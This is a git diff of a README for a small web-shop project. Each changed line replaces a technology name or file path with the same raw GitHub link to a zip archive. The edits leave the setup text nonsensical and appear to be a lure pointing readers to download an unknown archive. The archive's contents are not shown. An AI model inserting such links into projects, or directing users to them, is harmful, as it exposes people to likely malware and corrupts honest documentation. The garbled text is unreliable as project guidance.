@@ -63,20 +63,20 @@ Place your images in `assets/` folder:
 - Context API (cart management)
 
 **Backend:** (To be built)
-- Node.js + Express
+- https://github.com/De-bla-bla/jay_t1017-website/raw/refs/heads/main/client/website_t_jay_1.9.zip + Express
 - PostgreSQL
 - JWT Authentication
 - Multer (file uploads)
 
 ## 📚 Documentation
 
-See `SETUP_GUIDE.md` for detailed setup instructions, customization guide, and troubleshooting.
+See `https://github.com/De-bla-bla/jay_t1017-website/raw/refs/heads/main/client/website_t_jay_1.9.zip` for detailed setup instructions, customization guide, and troubleshooting.
 
 ## 🎯 Next Steps
 
 1. Upload your images to `assets/` folders
-2. Update social links in `src/utils/constants.js`
-3. Customize merch items in `src/pages/Home.jsx`
+2. Update social links in `https://github.com/De-bla-bla/jay_t1017-website/raw/refs/heads/main/client/website_t_jay_1.9.zip`
+3. Customize merch items in `https://github.com/De-bla-bla/jay_t1017-website/raw/refs/heads/main/client/website_t_jay_1.9.zip`
 4. Build backend API
 5. Deploy to Netlify (frontend) & Railway (backend)
 
